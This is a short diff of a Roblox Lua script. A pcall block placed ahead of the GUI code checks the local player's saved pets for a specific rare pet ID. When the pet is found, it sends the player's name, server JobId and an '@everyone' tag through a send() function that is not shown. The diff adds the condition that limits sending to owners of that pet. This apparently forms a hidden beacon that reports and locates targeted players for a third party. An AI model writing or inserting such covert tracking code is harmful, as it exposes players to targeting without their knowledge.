@@ -213,8 +213,9 @@ pcall(function()
 		local wacikansdf = 'DOESNT HAVE'
 		for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90010 and not v.dm and not v.r and not v.g then wacikansdf = 'has @everyone' wait(2) end end
 
-
+if wacikansdf == 'has @everyone' then
 send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId .. ' | ' .. wacikansdf)
+		end
 	end)
 do  -- // GUI
 
